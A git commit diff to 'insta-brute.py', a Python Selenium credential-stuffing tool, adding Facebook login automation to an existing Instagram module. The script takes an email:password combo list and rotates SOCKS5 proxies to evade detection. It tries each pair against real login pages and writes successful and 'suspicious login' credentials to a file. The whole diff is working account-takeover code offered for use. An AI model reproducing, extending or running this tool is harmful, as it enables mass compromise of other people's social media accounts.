b0ae5d852f81951371aa6bf1e3a99fa86a053c6f
Robert Maura <105942987+rmau2016@users.noreply.github.com>
2022-06-03 12:27:30 -0600

    SOCKS5 UPDATED and FACEBOOK ADDED

--- insta-brute.py
+++ insta-brute.py
@@ -9,10 +9,10 @@ from selenium.webdriver.common.proxy import Proxy, ProxyType
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from fake_useragent import UserAgent
-
+from seleniumwire import webdriver
 import pyfiglet as pyg
 
-res = pyg.figlet_format("Welcome to Insta-Brute!")
+res = pyg.figlet_format("Welcome to Selenium Brute!")
 print('If you need any extra options, go to my github https://github.com/rmau2016')
 print(res)
 Success = input("What's the Output File Name?: ")
@@ -27,20 +27,81 @@ for line in socks_4f:
     socks.append(line)
 print("\n SOCKS ADDED\n")
 m = 0
+choice = input("(1) Instagram\n(2) Facebook\n")
+
+
+class FacebookBot:
+    def __init__(self, username, password, i, socks_4f, socks_proxy, w_file):
+        if socks_4f != 'N':
+            options = {
+                'proxy':{
+                    'socks5': 'socks5://{}.format(socks_proxy)'
+                }
+            }
+            driver = webdriver.Chrome(
+                "C:\\Users\\lavon\\Desktop\\Chrome\\chromedriver", seleniumwire_options=options)
+            driver.implicitly_wait(0.6)
+            driver.get(
+                "https://m.facebook.com/login/")
+            time.sleep(getRandomTime())
+            driver.implicitly_wait(10)
+            driver.find_element_by_xpath(
+                "//input[@id='m_login_email']").send_keys(username)
+            driver.find_element_by_xpath(
+                "//input[@id='m_login_password']").send_keys(password)
+
+            time.sleep(getRandomTime())
+            print("CTRL-C to Save File!")
+
+            try:
+                try:
+                    driver.find_element_by_xpath("//button[@id='id[logout-button-with-confirm]']").click()
+                    print("SUSPICIOUS LOGIN ATTEMPT:" +
+            	          username + ":" + password + "\n")
+                    w_file.write("SUS-LOGIN: "+username + ":" + password + "\n")
+                except Exception:
+                    print("\nNo suspicious login attempt")
+                function_successfb(driver, username, password, w_file)
+            except Exception:
+               print("Unsuccessful login")
+
+        if socks_4f == 'N':
+            driver = webdriver.Chrome(
+                "C:\\Users\\lavon\\Desktop\\Chrome\\chromedriver")
+            driver.implicitly_wait(0.6)
+            driver.get("https://m.facebook.com/login/")
+            time.sleep(getRandomTime())
+            driver.find_element_by_xpath(
+                "//input[@id='m_login_email']").send_keys(username)
+            driver.find_element_by_xpath(
+                "//input[@id='m_login_password']").send_keys(password)
+
+            time.sleep(getRandomTime())
+            print("CTRL-C to Save File!")
+            try:
+                try:
+                    driver.find_element_by_xpath("//button[@id='id[logout-button-with-confirm]']").click()
+                    print("SUSPICIOUS LOGIN ATTEMPT:" +
+            	          username + ":" + password + "\n")
+                    w_file.write("SUS-LOGIN: "+username + ":" + password + "\n")
+                except Exception:
+                    print("\nNo suspicious login attempt")
+                function_successfb(driver, username, password, w_file)
+            except Exception:
+               print("Unsuccessful login")
+
 
 
 class InstaBot:
     def __init__(self, username, password, i, socks_4f, socks_proxy, w_file):
         if socks_4f != 'N':
-            options = Options()
-            options.add_argument(
-                '--proxy-server=socks5://{}'.format(socks_proxy.strip()))
-            options.add_argument("start-maximized")
-            ua = UserAgent()
-            user_agent = ua.random
-            options.add_argument(f'user-agent={user_agent}')
+            options = {
+                'proxy': {
+                    'socks5': 'socks5://{}.format(socks_proxy)'
+                }
+            }
             driver = webdriver.Chrome(
-                "C:\\Users\\lavon\\Desktop\\Chrome\\chromedriver", chrome_options=options)
+                "C:\\Users\\lavon\\Desktop\\Chrome\\chromedriver", seleniumwire_options=options)
             driver.implicitly_wait(0.6)
             driver.get(
                 "https://www.instagram.com/accounts/login")
@@ -56,10 +117,10 @@ class InstaBot:
 
             try:
                 try:
-            	    driver.find_element_by_xpath("//a[@class='_6vuJt']").click()
-            	    print("SUSPICIOUS LOGIN ATTEMPT:" +
+                    driver.find_element_by_xpath("//a[@class='_6vuJt']").click()
+                    print("SUSPICIOUS LOGIN ATTEMPT:" +
             	          username + ":" + password + "\n")
-            	    w_file.write("SUS-LOGIN: "+username + ":" + password + "\n")
+                    w_file.write("SUS-LOGIN: "+username + ":" + password + "\n")
                 except Exception:
                     print("\nNo suspicious login attempt")
                 function_success(driver, username, password, w_file)
@@ -82,10 +143,10 @@ class InstaBot:
 
             try:
                 try:
-            	    driver.find_element_by_xpath("//a[@class='_6vuJt']").click()
-            	    print("SUSPICIOUS LOGIN ATTEMPT:" +
+                    driver.find_element_by_xpath("//a[@class='_6vuJt']").click()
+                    print("SUSPICIOUS LOGIN ATTEMPT:" +
             	          username + ":" + password + "\n")
-            	    w_file.write("SUS-LOGIN: "+username + ":" + password+ "\n")
+                    w_file.write("SUS-LOGIN: "+username + ":" + password+ "\n")
                 except Exception:
                     print("\nNo suspicious login attempt")
                 function_success(driver, username, password, w_file)
@@ -99,13 +160,18 @@ def function_success(driver, username, password, w_file):
     print(username, ":", password, "IS A SUCCESS!")
     w_file.write(username + ":" + password+ "\n")
     driver.quit()
+def function_successfb(driver, username, password, w_file):
+        driver.find_element_by_xpath("//button[@value='OK']").click()
+        print(username, ":", password, "IS A SUCCESS!")
+        w_file.write(username + ":" + password + "\n")
+
 
 
 def getRandomTime():
     randTime = randint(3, 5)
     return randTime
 def Quit():
-	w_file.close()
+    w_file.close()
 
 
 r_file = input("What is the combo list in [Email:Pass] format?>")
@@ -119,23 +185,32 @@ for line in r_file:
     if socks_4f != 'N':
         socks_proxy = str(socks[i])
         try:
-            InstaBot(User, Password, i, socks_4f, socks_proxy, w_file)
+            if choice == '1':
+                InstaBot(User, Password, i, socks_4f, socks_proxy, w_file)
+            if choice == '2':
+                FacebookBot(User,Password, i, socks_4f, socks_proxy, w_file)
         except Exception:
-        	print("Page failed to load")
-        	x = input("Save File?[Y/N]")
-        	if x == 'Y':
-        		Quit()
-        		
+            print("Page failed to load")
+            x = input("Save File?[Y/N]")
+            if x == 'Y':
+                Quit()
+            if x == 'N':
+                quit()
         print("\nSOCKS: " + socks_proxy)
     if socks_4f == 'N':
         socks_proxy = str(socks)
         try:
-            InstaBot(User, Password, i, socks_4f, socks_proxy, w_file)
+            if choice == '1':
+                InstaBot(User, Password, i, socks_4f, socks_proxy, w_file)
+            if choice == '2':
+                FacebookBot(User,Password, i, socks_4f, socks_proxy, w_file)
         except:
-        	print("Page failed to load")
-        	x = input("Save File?[Y/N]")
-        	if x == 'Y':
-        		Quit()
+            print("Page failed to load")
+            x = input("Save File?[Y/N]")
+            if x == 'Y':
+                Quit()
+            if x == 'N':
+                quit()
     if socks_4f != 'N':
         if i == len(socks) - 1:
             print("Recycling Socks")
